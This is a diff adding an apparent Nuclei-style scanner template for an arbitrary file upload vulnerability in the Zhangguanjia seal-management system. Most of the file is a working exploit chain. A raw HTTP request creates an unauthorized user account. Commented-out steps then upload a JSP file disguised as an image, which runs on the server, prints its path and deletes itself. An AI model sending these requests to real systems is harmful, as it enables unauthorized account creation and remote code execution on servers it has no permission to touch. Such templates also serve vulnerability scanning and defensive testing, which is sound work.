@@ -1,0 +1,68 @@
+id: zgj-uploadFileByChunks-useradd_upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: info
+  description: 章管家是上海建业信息科技股份有限公司推出的一款针对传统印章风险管理提供的整套解决方案的工具。 该系统存在前台任意文件上传漏洞，攻击者成功利用该漏洞可以上传任意文件，从而获得服务器权限。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%AB%A0%E7%AE%A1%E5%AE%B6%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(XVE-2024-19042).md
+  tags: tags
+http:
+  - raw:
+      - |
+        POST /api/personSeal_jdy/saveUser.htm HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: sid=ed467a70-91e9-450d-a2c1-db1fab8123ad
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 290
+
+        {
+          "op": {},
+          "data": {
+            "mobile": "13333333330",
+            "uid": "13333333330",
+            "password": "qazwsx123",
+            "name": "testuser",
+            "return_url": "https://www.baidu.com",
+            "apisecretkey": "1",
+            "_id": "1",
+            "mail_address": "111@qq.com"
+          },
+          "b7o4ntosbfp": "="
+        }
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"code":200'
+#以上为创建用户，需要登录后在后台上传：
+#POST /seal/sealApply/uploadFileByChunks.htm?token=dingtalk_token&person_id=40288053800311e80180261b92ab005e&chunk=1&chunks=1&guid=1 HTTP/1.1
+#Host:
+#User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0)
+#Gecko/20100101 Firefox/128.0
+#Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+#Accept-Encoding: gzip, deflate
+#Accept-Language:
+#zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+#Cookie: sid=58139d92-115f-4e9b-99a1-ee200a8b17a0;
+#ZHANGIN_CHECKBOX=false; ZHANGIN_MOBILE=;JSESSIONID=30A3F3F324080E3B327FEB2EB82E2CB0
+#Content-Type: multipart/form-data; boundary=--------952870761
+#Content-Length: 140
+#
+#----------952870761
+#Content-Disposition: form-data; name="file"; filename="1.jsp"
+#Content-Type: image/jpeg
+#
+#<%@ page import= "java.io.File" %>
+#<%
+#out.println("111");
+#String filePath = application.getRealPath(request.getServletPath());
+#out.println(filePath);
+#new File(filePath).delete();
+#%>
+#----------952870761--
